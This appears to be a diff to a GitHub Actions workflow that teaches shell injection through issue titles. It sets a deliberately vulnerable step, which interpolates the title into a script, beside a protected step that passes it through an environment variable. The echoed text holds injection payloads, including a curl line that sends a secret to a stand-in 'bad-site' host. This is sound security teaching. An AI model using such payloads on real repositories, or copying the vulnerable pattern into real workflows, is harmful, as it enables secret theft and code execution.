@@ -10,15 +10,24 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: Print instruction
-        run: | 
-          echo Create an issue entitled, e.g.':' 'a";echo I have executed a script!"'
+        run: |
+          echo Create an issue entitled, e.g.':' 'a";echo !!! I have executed a script !!!"'
           echo As a result, an echo script will be executed
-          echo "---"
           echo Now imagine such a name ':' 'a"; curl http://bad-site/steal-password/$MY_SECRET'
-      - name: Assign label
+      - name: Vulnerable step - executing title as command
         run: |
           title="${{github.event.issue.title}}"
           if [[ "$title" == *"bug"* ]]; 
+          then
+            echo "Issue is a bug"
+          else
+            echo "Issue is NOT a bug"
+          fi
+      - name: Protected step - setting title as environment variable first
+        env:
+          TITLE: ${{github.event.issue.title}}
+        run: |
+          if [[ "$TITLE" == *"bug"* ]]; 
           then
             echo "Issue is a bug"
           else
